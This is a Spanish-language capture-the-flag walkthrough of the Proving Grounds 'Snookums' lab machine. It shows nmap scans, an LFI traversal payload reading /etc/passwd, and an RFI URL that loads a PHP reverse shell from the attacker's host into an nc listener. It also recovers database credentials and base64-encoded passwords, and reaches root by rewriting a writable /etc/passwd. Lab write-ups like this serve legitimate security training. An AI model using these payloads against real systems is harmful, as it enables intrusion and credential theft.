---
layout: post
title: Snookums (Linux - Intermediate) - Proving Grounds Practice
date: 10.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, Privilege Escalation, Lateral Movement, BASE64, File Permissions, OpenSSL, PASSWD, /ETC/PASSWD, ExploitDB, Feroxbuster, Fuzzing, LFI, Local File Inclusion, Remote File Inclusion, RFI, RCE, Directoy Traversal, MySQL, Database, SimplePHPGal 0.7 - Remote File Inclusion, PHP, Intermediate]
---

# Resolución paso a paso de la máquina Snookums:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.169.58 -oG allPorts
```

![image.png](assets/img/post-img/Snookums/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p21,22,80,111,139,445,3306,33060 --min-rate 5000 192.168.169.58
```

![image.png](assets/img/post-img/Snookums/image%201.png)

![image.png](assets/img/post-img/Snookums/image%202.png)

- En el escaneo de **NMAP** vemos varios servicios abiertos, entre ellos una web donde solo entrar nos pone la versión:

![image.png](assets/img/post-img/Snookums/image%203.png)

## EXPLOTACIÓN

- Después de investigar un poco y descartar algunas opciones encontramos un **EXPLOIT** para “**SimplePHPGal 0.7 - Remote File Inclusion**”  en el que dicen que podemos lograr un **RFI** a través **IMAGE.PHP**. Realizamos un poco de **FUZZING** para ver que rutas tenemos:

[SimplePHPGal 0.7 - Remote File Inclusion](https://www.exploit-db.com/exploits/48424)

![image.png](assets/img/post-img/Snookums/image%204.png)

### FEROXBUSTER

```bash
feroxbuster --url http://192.168.169.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301 -x php
```

![image.png](assets/img/post-img/Snookums/image%205.png)

- Parece que tenemos la ruta **IMAGE.PHP** que nos indica el **EXPLOIT**, así que primero probamos suerte a ver si también podemos explotar un **LFI** y, efectivamente podemos leer archivos del sistema y en el **/ETC/PASSWD** podemos ver que hay un usuario **MICHAEL**:

```bash
http://192.168.169.58/image.php?img=../../../../../../../../../etc/passwd
```

![image.png](assets/img/post-img/Snookums/image%206.png)

![image.png](assets/img/post-img/Snookums/image%207.png)

- Investigamos un poquito más para ver si podemos acceder a alguna **CLAVE PRIVADA** para acceder por **SSH** pero no tenemos suerte. Vamos a probar con el **RFI**!

- Levantamos un servidor web con **PYTHON** en nuestra máquina atacante e intentamos lanzar una petición a través del **RFI** intentando cagar un archivo inexistente **TEST.TXT** solo para comprobar si tenemos alcance y podemos, posteriormente, intentar cargar una **WEBSHELL** o lanzarnos directamente una **REVERSE SHELL** para lograr el **RCE**:

```bash
python3 -m http.server 80
```

![image.png](assets/img/post-img/Snookums/image%208.png)

- Lanzamos la petición y al cabo de unos segundos la recibimos en el servidor web:

```bash
http://192.168.169.58/image.php?img=http://192.168.45.223/test.txt
```

![image.png](assets/img/post-img/Snookums/image%209.png)

![image.png](assets/img/post-img/Snookums/image%2010.png)

- Ahora que sabemos que tenemos conectividad, vamos a intentar saltarnos el paso de la **WEBSHELL** y, sabiendo que el servidor corre **PHP**, vamos a generarnos una **REVERSE SHELL** en **PHP** para ver si podemos conseguir una sesión en la máquina víctima:

https://www.revshells.com/

![image.png](assets/img/post-img/Snookums/image%2011.png)

- Nos guardamos la **REVERSE SHELL** en el directorio donde tenemos levantado el **SERVIDOR** con **PYTHON**, nos ponemos en escucha con **NC** e intentamos cargar la **SHELL** a través del **RFI**:

![image.png](assets/img/post-img/Snookums/image%2012.png)

- Lanzamos la petición y, después de un par de minutos vemos que se ha tramitado la petición con un **código de estado 200** pero no recibimos ninguna conexión:

```bash
http://192.168.169.58/image.php?img=http://192.168.45.223/rshell.php
```

![image.png](assets/img/post-img/Snookums/image%2013.png)

- Después de mucho rato y de algunas pruebas, descubrimos que solo podemos recibir la **REVERSE SHELL** si nos ponemos en escucha por **NC** a través de un **NÚMERO de PUERTO** de los que la máquina víctima tiene abiertos. En este caso vamos a elegir el puerto “**111**”. Modificamos el puerto en la **REVERSE SHEL**L, lo lanzamos de nuevo y recibimos la conexión:

![image.png](assets/img/post-img/Snookums/image%2014.png)

```bash
nc -lvnp 111
```

![image.png](assets/img/post-img/Snookums/image%2015.png)

## TRATAMIENTO DE LA TTY

- Realizamos el tratamiento de la **TTY** para poder trabajar más cómodos desde una **SHELL INTERACTIVA**:

```bash
script /dev/null -c bash

control+z

stty raw -echo; fg

reset xterm

export TERM=xterm-256color

export SHELL=bash

stty rows 52 columns 214 
```

## MOVIMIENTO LATERAL

- Una vez dentro del sistema vemos que estamos bajo el usuario **APACHE** y no tenemos permisos en ninguno de los directorios de **ROOT** o del usuario **MICHAEL**. En el directorio del servidor web (**/var/www/html**) encontramos un archivo **DB.PHP** que ya habíamos podido ver previamente haciendo **FUZZING DE DIRECTORIOS** pero no pudimos leerlo. Accedemos al archivo y encontramos credenciales para conectarnos a la **BBDD**:

![image.png](assets/img/post-img/Snookums/image%2016.png)

> **User: root
Password: MalapropDoffUtilize1337**
> 

- Nos conectamos a la **BBDD** contra el **LOCALHOST**:

```bash
mysql -u root -p'MalapropDoffUtilize1337' -h 127.0.0.1
```

![image.png](assets/img/post-img/Snookums/image%2017.png)

- Una vez dentro seleccionamos la **BBDD** “**SimplePHPGal**”, listamos las tablas y encontramos credenciales de tres usuarios dentro de la única tabla que hay “**USERS**”:

![image.png](assets/img/post-img/Snookums/image%2018.png)

- Tenemos los nombres de usuario y las contraseñas **DOBLEMENTE ENCODEADAS** en **BASE64**, por lo que podemos descifrarlas fácilmente:

```bash
josh: VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael: U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena: VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
```

```bash
# josh - PASSWORD: MobilizeHissSeedtime747
echo 'VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0='| base64 -d | base64 -d; echo

# michael - PASSWORD: HockSydneyCertify123
echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ=='| base64 -d | base64 -d; echo

# serena - PASSWORD: OverallCrestLean000
echo 'VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ=='| base64 -d | base64 -d; echo
```

![image.png](assets/img/post-img/Snookums/image%2019.png)

- Sabemos que hay un usuario **MICHAEL** en el sistema, así que vamos a intentar movernos hacia ese usuario:

> **User: michael
Password: HockSydneyCertify123**
> 

![image.png](assets/img/post-img/Snookums/image%2020.png)

- Ahora ya podemos acceder al directorio principal del usuario **MICHAEL** y leer la primera **FLAG**:

![image.png](assets/img/post-img/Snookums/image%2021.png)

## ESCALADA DE PRIVILEGIOS

- Realizando la enumeración descubrimos unos **PERMISOS** mal configurados en el archivo **/ETC/PASSWD** donde vemos que el propietario es el usuario **MICHAEL**. Vamos a abusar de esos permisos para escalar privilegios y convertirnos en **ROOT**:

![image.png](assets/img/post-img/Snookums/image%2022.png)

- Vamos a usar **OPENSSL** para generar una **CONTRASEÑA** en el formato correcto para, posteriormente, sustituirla en el archivo **/ETC/PASSWD** en el usuario ROOT.

```bash
openssl passwd contraseña
```

![image.png](assets/img/post-img/Snookums/image%2023.png)

- Una vez tengamos la nueva cadena podemos abrir el archivo **/ETC/PASSWD** y modificarlo. (Como en la máquina víctima no tenemos **NANO** vamos a abrir el archivo con **VI**):

```bash
vi /etc/passwd
```

![image.png](assets/img/post-img/Snookums/image%2024.png)

- Una vez modificado y guardado el archivo podemos escalar a **ROOT**:

```bash
su root
```

![image.png](assets/img/post-img/Snookums/image%2025.png)

- Ahora ya podemos acceder al directorio de **ROOT** y leer la **FLAG**:

![image.png](assets/img/post-img/Snookums/image%2026.png)